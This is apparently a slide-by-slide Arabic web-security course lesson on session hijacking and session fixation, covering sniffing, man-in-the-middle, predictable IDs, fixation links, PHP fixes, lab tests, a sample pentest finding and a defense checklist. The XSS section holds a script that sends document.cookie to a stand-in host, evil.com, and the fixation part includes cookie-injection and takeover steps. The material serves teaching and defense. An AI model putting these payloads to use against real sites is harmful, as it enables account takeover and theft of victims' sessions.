# 🎓 الجلسة 7: Session Hijacking & Session Fixation
## Slides 93 → 106

---

## 📌 Slide 93-94: عنوان القسم + مقدمة
### Session Hijacking & Session Fixation

أهلاً بيك في الجلسة السابعة! 🔥 الجلسة دي من **أمتع جلسات الكورس** لأننا هنشوف الهجمات الحقيقية على الـ Sessions!

### تعريف سريع:

> **Session Hijacking** (سرقة الجلسة) = المهاجم **بيسرق** Session Token بتاع مستخدم **بعد ما يكون سجل دخول**. يعني بيسرق "البطاقة" بعد ما صاحبها يطلعها.

> **Session Fixation** (تثبيت الجلسة) = المهاجم **بيفرض** Session ID معين على الضحية **قبل ما يسجل دخول**. يعني بيديك "بطاقة مزورة" وبيستناك تفعّلها بتسجيل دخولك!

### الفرق الجوهري:

```
Timeline:
─────────────────────────────────────────────────►

Session Hijacking:
[ضحية بتسجل دخول] ──► [ضحية عندها Session] ──► [مهاجم بيسرق الـ Session]
                                                   ↑ الهجوم هنا (بعد الـ Login)

Session Fixation:
[مهاجم بيجهز Session ID] ──► [ضحية بتستخدمه] ──► [ضحية بتسجل دخول]──► [مهاجم بيستخدم نفس الـ ID]
↑ الهجوم هنا (قبل الـ Login)
```

---

## 📌 Slide 95-96: Session Hijacking vs Session Fixation - التفصيل
### Session Hijacking vs. Session Fixation - Deep Comparison

| النقطة | Session Hijacking 🔴 | Session Fixation 🟠 |
|--------|---------------------|---------------------|
| **التوقيت** | **بعد** الـ Authentication | **قبل** الـ Authentication |
| **الآلية** | سرقة Session Token شرعي | فرض Session ID معروف على الضحية |
| **شرط النجاح** | الحصول على الـ Token | التطبيق مش بيغير الـ Session ID بعد Login |
| **الصعوبة** | أصعب (محتاج يلاقي طريقة للسرقة) | أسهل (لو الثغرة موجودة) |
| **الحماية الأساسية** | HttpOnly + Secure + HTTPS | Session Regeneration بعد Login |

---

## 📌 Slide 97-98: Session Hijacking بالتفصيل
### How Session Hijacking Works

### المرحلة 1: إنشاء الجلسة (Session Establishment) ✅
```
هنا كل حاجة عادية وطبيعية:

1. المستخدم بيروح موقع bank.com
2. بيكتب Username + Password
3. السيرفر بيتحقق ← صحيح!
4. السيرفر بيعمل Session ID = "xK9m2pL4wN"
5. السيرفر بيبعته للمتصفح في Cookie:
   Set-Cookie: session=xK9m2pL4wN; HttpOnly; Secure

← لحد هنا كل حاجة تمام ✅
```

### المرحلة 2: اعتراض الـ Session ID (Interception) 💀

هنا المهاجم بيسرق الـ Session ID بإحدى الطرق دي:

#### الطريقة 1: Sniffing (التنصت على الشبكة) 📡
```
الشرط: المستخدم على شبكة غير مشفرة (HTTP) أو WiFi مفتوح

المهاجم بيستخدم أداة زي Wireshark:
1. بيفتح Wireshark على نفس الشبكة
2. بيعمل Filter: http.cookie contains "session"
3. بيشوف كل الـ Cookies اللي بتتبعت!
4. بيلاقي: Cookie: session=xK9m2pL4wN

لو الـ Cookie عليها Secure flag:
← مش هتتبعت على HTTP ← السرقة فشلت ✅

لو مفيش Secure flag:
← المهاجم شافها! 💀
```

#### الطريقة 2: Man-in-the-Middle (رجل في المنتصف) 🕴️
```
المهاجم بيخلّي نفسه "وسيط" بين المستخدم والسيرفر:

المستخدم ←→ [المهاجم 🕴️] ←→ السيرفر

أدوات شائعة:
- Bettercap (ARP Spoofing)
- mitmproxy (SSL Strip)
- WiFi Pineapple (Rogue AP)

السيناريو:
1. المهاجم بيعمل WiFi مزيف باسم "Starbucks_Free_WiFi"
2. الضحية بتتوصل بيه
3. كل الـ Traffic من وإلى الضحية بتعدي على المهاجم
4. المهاجم بيشوف الـ Cookies في الـ HTTP Requests
5. سرق الـ Session! 💀

الحماية: HTTPS + HSTS + Secure Cookie Flag
```

#### الطريقة 3: Cross-Site Scripting (XSS) 💉
```javascript
// المهاجم بيلاقي ثغرة XSS في الموقع
// بيحقن الكود ده:

<script>
  // بيقرأ الـ Cookies
  var cookies = document.cookie;
  
  // بيبعتها لسيرفره
  var img = new Image();
  img.src = "https://evil.com/steal.php?c=" + 
            encodeURIComponent(cookies);
</script>

// لما الضحية تفتح الصفحة دي:
// المتصفح بينفذ الكود ← بيبعت الـ Cookies للمهاجم!

// الحماية: HttpOnly Flag!
// لو الـ Cookie عليها HttpOnly:
// document.cookie مش هيرجع الـ Session Cookie خالص!
```

#### الطريقة 4: Predictable Session IDs (توقع الـ Session ID) 🎲
```
لو الـ Session IDs قابلة للتوقع:
Session 1: sess_001_20241110
Session 2: sess_002_20241110
Session 3: sess_003_20241110

المهاجم يقدر يتوقع:
Session 4: sess_004_20241110  ← ممكن ده Session حد تاني!

أو لو مبنية على Timestamp:
Session: 1699900123 (Unix Timestamp)
المهاجم يقدر يجرب Timestamps قريبة ويلاقي Sessions صالحة!

الأداة: Burp Suite Sequencer
بتحلل آلاف الـ Session IDs وبتكشف الـ Patterns
```

---

## 📌 Slide 99: مرحلة الاستيلاء والاستغلال
### Session Takeover & Exploitation

### المرحلة 3: الاستيلاء على الجلسة (Session Takeover) 🎯
```
المهاجم بعد ما سرق الـ Session ID:

1. بيفتح متصفحه
2. بيروح لموقع bank.com
3. بيفتح DevTools (F12) → Application → Cookies
4. بيضيف Cookie جديدة:
   Name:  session
   Value: xK9m2pL4wN  (الـ Session المسروقة)
5. بيعمل Refresh للصفحة
6. السيرفر بيشوف الـ Session ID الصحيح
7. "أهلاً أحمد! اتفضل الـ Dashboard بتاعك" 💀
```

### المرحلة 4: الاستغلال (Exploitation) ⚡
```
المهاجم دلوقتي هو "أحمد" بالنسبة للسيرفر!
يقدر يعمل أي حاجة أحمد يقدر يعملها:

✅ يشوف بيانات الحساب الحساسة
✅ يحول فلوس من الحساب
✅ يغير الباسورد والإيميل
✅ يعمل عمليات شراء
✅ يمسح الحساب!

وكل ده من غير ما يعرف باسورد أحمد! 😱
```

> **🔴 من واقع الـ Pentesting:** في اختبار اختراق لبنك، لقيت إن الموقع بيستخدم HTTP في صفحة واحدة بس (صفحة المساعدة). رغم إن باقي الموقع HTTPS، الـ Session Cookie مكانش عليها `Secure` flag. يعني ممكن حد يعترض الـ Cookie من الصفحة الوحيدة دي ويسرق الجلسة! كتبتها كـ **Critical Finding** وتم إصلاحها فوراً.

---

## 📌 Slide 100-102: Session Fixation بالتفصيل
### How Session Fixation Works

### المرحلة 1: المهاجم بيجهز الـ Session ID 🔧

```
المهاجم بيحصل على Session ID صالح بطريقتين:

الطريقة 1: بيفتح الموقع بنفسه (بدون تسجيل دخول)
← السيرفر بيديله Session ID: sess_attacker_123

الطريقة 2: بيخمن Session ID (لو الـ IDs ضعيفة)
← بيعمل Session ID: sess_easy_456
```

### المرحلة 2: المهاجم بيبعت الـ Session ID للضحية 📧

```
الطريقة 1: عن طريق URL
المهاجم بيبعت للضحية رسالة أو إيميل فيها:
"اضغط هنا عشان تدخل حسابك"
https://bank.com/login?sessionid=sess_attacker_123
↑ الـ Session ID بتاع المهاجم مزروع في الـ URL

الطريقة 2: عن طريق JavaScript Injection (لو فيه XSS)
<script>
document.cookie = "session=sess_attacker_123";
</script>

الطريقة 3: عن طريق HTTP Response Header (لو فيه MitM)
Set-Cookie: session=sess_attacker_123
```

### المرحلة 3: الضحية بتسجل دخول 🔑

```
الضحية بتضغط على اللينك:
1. بتروح لـ https://bank.com/login?sessionid=sess_attacker_123
2. بتدخل Username + Password
3. بتسجل دخول بنجاح ✅

المشكلة الكبيرة هنا:
لو التطبيق مغيرش الـ Session ID بعد Login ❌
← الجلسة المسجلة هي نفسها: sess_attacker_123
← ونفس الـ ID ده عند المهاجم!
```

### المرحلة 4: المهاجم بيدخل الحساب! 💀

```
المهاجم عنده الـ Session ID: sess_attacker_123
الضحية سجلت دخول بنفس الـ ID

المهاجم بيفتح متصفحه:
Cookie: session=sess_attacker_123
GET /dashboard HTTP/1.1

السيرفر بيشوف الـ Session ID:
sess_attacker_123 = الضحية مسجلة دخول ← "أهلاً يا ضحية!"

المهاجم دخل حساب الضحية! 💀
من غير ما يعرف باسوردها!
من غير ما يسرق أي حاجة!
بس لأن التطبيق مغيرش الـ Session ID بعد الـ Login!
```

---

## 📌 Slide 103: رسم توضيحي لـ Session Fixation
### Session Fixation - Visual Flow

```
                   المهاجم 🕴️
                      │
       ① بيطلب Session  │  ④ بيستخدم نفس الـ Session ID
          من الموقع     │     بعد ما الضحية سجلت دخول
                      │
                      ▼
              ┌──────────────┐
              │   السيرفر 🖥️  │
              │              │
              │ Session ID:  │
              │ ABC123       │
              └──────┬───────┘
                     │
       ② السيرفر بيدي │  ③ الضحية بتسجل دخول
          Session ID  │     بنفس الـ Session ID
                     │
                     ▼
                الضحية 👤
                
    ② المهاجم بيبعت اللينك للضحية:
    https://bank.com/login?session=ABC123
    
    ③ الضحية بتفتح اللينك وبتسجل دخول
    
    ④ المهاجم بيستخدم ABC123 ← بيدخل حساب الضحية!
```

---

## 📌 Slide 104-105: أسباب ثغرات Session Fixation
### What Causes Session Fixation Vulnerabilities

### الأسباب الرئيسية (5 أسباب):

### 1️⃣ عدم تجديد الـ Session ID بعد Login

```
ده السبب الأهم والأكثر شيوعاً!

# الكود الضعيف (PHP مثال):
<?php
session_start();  // بيستخدم نفس الـ Session ID
$_SESSION['user'] = $username;
// ← مغيرش الـ ID! ❌

# الكود الآمن:
<?php
session_start();
session_regenerate_id(true);  // بيعمل Session ID جديد! ✅
$_SESSION['user'] = $username;
```

### 2️⃣ قبول Session IDs من الـ URL

```
# الـ URL ده بيحدد الـ Session:
https://example.com/login?PHPSESSID=abc123

# لو التطبيق بيقبل الـ Session من الـ URL:
← المهاجم يقدر يبعت لينك فيه Session ID يتحكم فيه!

# الحل في PHP:
php.ini: session.use_only_cookies = 1
# كده مش هيقبل Session من URL خالص
```

### 3️⃣ Session IDs ضعيفة أو قابلة للتوقع

```
# ضعيف:
Session: user_1, user_2, user_3 (Sequential)
Session: 1699900001 (Timestamp-based)

# قوي:
Session: a7f329d4e8b1c5f6789abcdef (Random + High Entropy)
```

### 4️⃣ غياب الـ Cookie Security Flags

```http
# ضعيف:
Set-Cookie: session=abc123
# (مفيش أي flags!)

# قوي:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 5️⃣ عمر طويل للجلسة بدون Timeout

```
# ضعيف: مفيش Expiration
Set-Cookie: session=abc123
# ← الجلسة ممكن تفضل صالحة لأيام!

# قوي: عمر محدود
Set-Cookie: session=abc123; Max-Age=1800
# ← 30 دقيقة بس
```

---

## 📌 Slide 106: Lab Demo - Session Fixation
### 🧪 Lab Demo: Session Fixation

### خطوات الاختبار العملي:

#### الاختبار 1: هل الـ Session ID بيتغير بعد Login?
```
1. افتح الموقع في Incognito Mode
2. شوف الـ Session Cookie في DevTools:
   Cookie BEFORE login: session=OLD_ID_123

3. سجل دخول بحساب عادي
4. شوف الـ Session Cookie تاني:
   Cookie AFTER login: session=???

   لو session=NEW_ID_456 ← آمن ✅ (Session Regeneration شغال)
   لو session=OLD_ID_123 ← ثغرة! ❌ (نفس الـ ID!)
```

#### الاختبار 2: هل التطبيق بيقبل Session ID من URL?
```
1. افتح:
   https://target.com/login?session_id=MY_CUSTOM_ID

2. سجل دخول

3. شوف الـ Session Cookie:
   لو session=MY_CUSTOM_ID ← ثغرة Session Fixation! ❌
   لو session=RANDOM_NEW_ID ← آمن ✅
```

#### الاختبار 3: سيناريو هجوم كامل
```
1. [المهاجم] يفتح الموقع ← ياخد Session ID: FIXED_SESSION
2. [المهاجم] يبعت للضحية:
   "اضغط هنا: https://target.com/?session=FIXED_SESSION"
3. [الضحية] تضغط اللينك ← تسجل دخول
4. [المهاجم] يفتح متصفحه ← يحط Cookie: session=FIXED_SESSION
5. [المهاجم] يكون مسجل دخول كضحية! 💀
```

#### كتابة التقرير:
```
Finding: Session Fixation Vulnerability
Severity: High (CVSS 8.1)
Description: The application does not regenerate the session
             ID after successful authentication, allowing an
             attacker to fixate a session ID and hijack the
             user's session post-login.
Steps to Reproduce:
  1. Obtain a valid session ID from the application
  2. Send the session ID to the victim via URL
  3. Wait for the victim to authenticate
  4. Use the same session ID to access the victim's account
Recommendation:
  1. Regenerate session ID after login (session_regenerate_id)
  2. Reject session IDs from URL parameters
  3. Set session.use_only_cookies=1
  4. Implement session binding (tie to IP/User-Agent)
```

---

## 🎯 ملخص الجلسة السابعة

| المفهوم | الشرح | طريقة الحماية |
|---------|-------|---------------|
| **Session Hijacking** | سرقة Session Token بعد Login | HttpOnly + Secure + HTTPS |
| **Sniffing** | التنصت على الشبكة لسرقة Cookies | Secure Flag + HTTPS + HSTS |
| **MitM** | التوسط بين المستخدم والسيرفر | HTTPS + Certificate Pinning |
| **XSS Cookie Theft** | سرقة Cookies عبر JavaScript | HttpOnly Flag |
| **Predictable IDs** | توقع Session IDs الضعيفة | CSPRNG + High Entropy |
| **Session Fixation** | فرض Session ID قبل Login | Session Regeneration |
| **URL-Based Sessions** | Session ID في الرابط | use_only_cookies = 1 |

### 🔧 الـ Defense Checklist:
```
□ Session Regeneration بعد كل Login
□ HttpOnly على كل Session Cookies
□ Secure Flag على كل Session Cookies
□ SameSite=Lax على الأقل
□ HTTPS في كل الموقع + HSTS
□ رفض Session IDs من URLs
□ Session Timeout (30 دقيقة max)
□ تدمير الـ Session على السيرفر عند Logout
□ ربط الـ Session بالـ IP/User-Agent (اختياري)
```

> **📝 الجلسة الجاية:** هنتكلم عن **CSRF (Cross-Site Request Forgery)** بالتفصيل - إزاي المهاجم يخلي متصفحك ينفذ عمليات بدون علمك + مقدمة في **Token-Based Authentication** وأنواع الـ Tokens! 🚀
